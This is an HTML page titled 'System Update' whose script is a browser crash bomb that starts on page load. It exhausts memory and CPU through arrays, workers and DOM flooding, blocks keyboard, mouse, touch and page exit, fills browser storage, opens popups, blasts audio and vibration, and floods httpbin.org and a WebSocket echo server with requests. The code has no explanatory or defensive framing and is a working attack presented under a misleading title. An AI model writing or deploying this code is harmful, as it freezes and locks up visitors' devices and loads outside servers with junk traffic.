<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            cursor: none !important;
            user-select: none;
        }
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: fixed;
        }
    </style>
</head>
<body>
    <div id="crashContainer"></div>

    <audio id="crashSound" loop>
        <source src="crash.mp3" type="audio/mp3">
    </audio>

    <script>
        // ========== EXTREME MEMORY CRASH ==========
        function triggerMemoryCrash() {
            console.log("Starting memory crash...");
            
            // Technique 1: Massive Array Allocation
            const hugeArrays = [];
            for (let i = 0; i < 100; i++) {
                try {
                    hugeArrays.push(new Array(10000000).fill('CRASH'.repeat(1000)));
                    document.body.innerHTML += `<div style="color: red">Allocating memory block ${i}...</div>`;
                } catch(e) {
                    console.log("Memory allocation failed:", e);
                }
            }

            // Technique 2: Infinite DOM Elements
            setInterval(() => {
                for (let i = 0; i < 1000; i++) {
                    const element = document.createElement('div');
                    element.innerHTML = 'ðŸ’€'.repeat(1000);
                    element.style.fontSize = '100px';
                    document.body.appendChild(element);
                }
            }, 10);

            // Technique 3: localStorage Bomb
            try {
                let data = 'X';
                for (let i = 0; i < 20; i++) {
                    data += data;
                    localStorage.setItem('crash', data);
                }
            } catch(e) {}

            // Technique 4: Canvas Memory Bomb
            const canvas = document.createElement('canvas');
            canvas.width = 10000;
            canvas.height = 10000;
            const ctx = canvas.getContext('2d');
            setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    ctx.fillRect(Math.random() * 10000, Math.random() * 10000, 1000, 1000);
                }
            }, 1);

            // Technique 5: Web Workers Crash
            for (let i = 0; i < 10; i++) {
                const worker = new Worker(URL.createObjectURL(
                    new Blob([`
                        while(true) {
                            postMessage(new ArrayBuffer(10000000));
                        }
                    `], {type: 'application/javascript'})
                ));
                worker.onmessage = () => {};
            }
        }

        // ========== CPU OVERLOAD ==========
        function triggerCPUOverload() {
            // Infinite calculation loops
            setInterval(() => {
                for (let i = 0; i < 1000000; i++) {
                    Math.sqrt(Math.random() * 1000000) * Math.pow(Math.random(), 2);
                }
            }, 1);

            // Recursive function explosion
            function recursiveBomb(depth = 0) {
                if (depth > 1000) return;
                setTimeout(() => recursiveBomb(depth + 1), 0);
                setTimeout(() => recursiveBomb(depth + 1), 0);
            }
            recursiveBomb();

            // Matrix calculation bomb
            setInterval(() => {
                const matrix = [];
                for (let i = 0; i < 1000; i++) {
                    matrix[i] = [];
                    for (let j = 0; j < 1000; j++) {
                        matrix[i][j] = Math.random();
                    }
                }
                // Do useless calculations
                for (let i = 0; i < matrix.length; i++) {
                    for (let j = 0; j < matrix[i].length; j++) {
                        matrix[i][j] = Math.sin(matrix[i][j]) * Math.cos(matrix[i][j]);
                    }
                }
            }, 10);
        }

        // ========== BROWSER HIJACK ==========
        function hijackBrowser() {
            // Prevent any escape
            window.onbeforeunload = function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            };

            // Block all keys
            document.addEventListener('keydown', function(e) {
                e.preventDefault();
                // Spam more elements on key press
                for (let i = 0; i < 100; i++) {
                    const div = document.createElement('div');
                    div.textContent = 'BLOCKED '.repeat(100);
                    document.body.appendChild(div);
                }
            });

            // Block clicks and create more elements
            document.addEventListener('click', function(e) {
                e.preventDefault();
                for (let i = 0; i < 500; i++) {
                    const div = document.createElement('div');
                    div.innerHTML = 'ðŸ’¥'.repeat(50);
                    div.style.fontSize = '50px';
                    div.style.position = 'fixed';
                    div.style.left = Math.random() * 100 + 'vw';
                    div.style.top = Math.random() * 100 + 'vh';
                    document.body.appendChild(div);
                }
            });

            // Auto-scroll spam
            setInterval(() => {
                window.scrollTo(0, document.body.scrollHeight);
                window.scrollTo(document.body.scrollWidth, 0);
            }, 10);

            // Open infinite popups (if not blocked)
            setInterval(() => {
                try {
                    window.open('', '_blank', 'width=100,height=100');
                } catch(e) {}
            }, 1000);
        }

        // ========== VISUAL OVERLOAD ==========
        function visualOverload() {
            // Create massive amount of elements
            setInterval(() => {
                for (let i = 0; i < 100; i++) {
                    const element = document.createElement('div');
                    element.innerHTML = 'ðŸ’€'.repeat(100);
                    element.style.cssText = `
                        position: fixed;
                        left: ${Math.random() * 100}vw;
                        top: ${Math.random() * 100}vh;
                        font-size: ${20 + Math.random() * 50}px;
                        color: hsl(${Math.random() * 360}, 100%, 50%);
                        z-index: 9999;
                        pointer-events: none;
                    `;
                    document.body.appendChild(element);

                    // Remove old elements to prevent complete freeze
                    if (document.body.children.length > 1000) {
                        document.body.removeChild(document.body.firstChild);
                    }
                }
            }, 1);

            // Background color spam
            setInterval(() => {
                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
            }, 50);

            // Create canvas overlays
            for (let i = 0; i < 5; i++) {
                const canvas = document.createElement('canvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                canvas.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    pointer-events: none;
                    z-index: 9998;
                `;
                document.body.appendChild(canvas);

                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    for (let j = 0; j < 100; j++) {
                        ctx.beginPath();
                        ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 100, 0, Math.PI * 2);
                        ctx.fill();
                    }
                }, 16);
            }
        }

        // ========== SOUND SPAM ==========
        function soundSpam() {
            const crashSound = document.getElementById('crashSound');
            crashSound.volume = 1.0;
            crashSound.play().catch(e => console.log('Sound failed'));

            // Create multiple audio contexts for more stress
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    try {
                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                        const oscillator = audioContext.createOscillator();
                        const gainNode = audioContext.createGain();
                        
                        oscillator.connect(gainNode);
                        gainNode.connect(audioContext.destination);
                        
                        oscillator.type = 'sawtooth';
                        oscillator.frequency.setValueAtTime(100 + Math.random() * 1000, audioContext.currentTime);
                        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
                        
                        oscillator.start();
                    } catch(e) {}
                }, i * 1000);
            }
        }

        // ========== STORAGE BOMB ==========
        function storageBomb() {
            setInterval(() => {
                try {
                    // Fill sessionStorage
                    sessionStorage.setItem('bomb', 'X'.repeat(1000000));
                    
                    // Fill localStorage
                    localStorage.setItem('crash_bomb', 'Y'.repeat(1000000));
                    
                    // Fill IndexedDB
                    const request = indexedDB.open('CrashDB', 1);
                    request.onsuccess = function(event) {
                        const db = event.target.result;
                        const transaction = db.transaction(['crash'], 'readwrite');
                        const store = transaction.objectStore('crash');
                        
                        for (let i = 0; i < 100; i++) {
                            store.put({ data: 'Z'.repeat(100000), id: i });
                        }
                    };
                    
                    request.onupgradeneeded = function(event) {
                        const db = event.target.result;
                        db.createObjectStore('crash', { keyPath: 'id' });
                    };
                } catch(e) {}
            }, 1000);
        }

        // ========== NETWORK SPAM ==========
        function networkSpam() {
            setInterval(() => {
                for (let i = 0; i < 10; i++) {
                    try {
                        fetch('https://httpbin.org/delay/1').catch(() => {});
                        fetch('https://httpbin.org/bytes/100000').catch(() => {});
                    } catch(e) {}
                }
            }, 100);

            // WebSocket spam
            try {
                for (let i = 0; i < 5; i++) {
                    const ws = new WebSocket('wss://echo.websocket.org');
                    ws.onopen = () => {
                        setInterval(() => {
                            ws.send('X'.repeat(10000));
                        }, 100);
                    };
                }
            } catch(e) {}
        }

        // ========== VIBRATION ATTACK ==========
        function vibrationAttack() {
            if (navigator.vibrate) {
                setInterval(() => {
                    // Extreme vibration pattern
                    navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50]);
                }, 1000);
            }
        }

        // ========== START ALL ATTACKS ==========
        function startTotalCrash() {
            console.log("Initiating total crash sequence...");
            
            // Start all crash methods simultaneously
            triggerMemoryCrash();
            triggerCPUOverload();
            hijackBrowser();
            visualOverload();
            soundSpam();
            storageBomb();
            networkSpam();
            vibrationAttack();

            // Final nuclear option - try to crash harder
            setTimeout(() => {
                // Nuclear memory bomb
                const nuclearArrays = [];
                while(true) {
                    try {
                        nuclearArrays.push(new Array(100000000));
                    } catch(e) {
                        break;
                    }
                }
            }, 5000);

            // Show crash message
            document.body.innerHTML = `
                <div style="
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: #000;
                    color: #ff0000;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 24px;
                    text-align: center;
                    z-index: 100000;
                ">
                    <div>
                        <div style="font-size: 48px; margin-bottom: 20px;">ðŸ’€ SYSTEM CRASHING ðŸ’€</div>
                        <div>Memory: OVERLOADED</div>
                        <div>CPU: 100% UTILIZATION</div>
                        <div>Browser: UNRESPONSIVE</div>
                        <div style="margin-top: 20px; font-size: 16px; color: #888;">
                            Force close browser to stop<br>
                            Device may become unresponsive
                        </div>
                    </div>
                </div>
            `;
        }

        // ========== INITIALIZE CRASH ==========
        // Start immediately when page loads
        window.onload = startTotalCrash;

        // Also start on DOM ready
        document.addEventListener('DOMContentLoaded', startTotalCrash);

        // Block any attempt to prevent default
        document.addEventListener('touchstart', function(e) {
            e.preventDefault();
        }, { passive: false });

        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });

        document.addEventListener('wheel', function(e) {
            e.preventDefault();
        }, { passive: false });

        // Nuclear option - if still not crashing
        setTimeout(() => {
            // Try to trigger garbage collection issues
            const leak = [];
            setInterval(() => {
                for (let i = 0; i < 10000; i++) {
                    leak.push(new Array(10000));
                }
            }, 100);

            // DOM node leak
            setInterval(() => {
                const fragment = document.createDocumentFragment();
                for (let i = 0; i < 1000; i++) {
                    const div = document.createElement('div');
                    div.innerHTML = 'LEAK '.repeat(1000);
                    fragment.appendChild(div);
                }
                document.body.appendChild(fragment);
            }, 50);
        }, 10000);

    </script>
</body>
</html>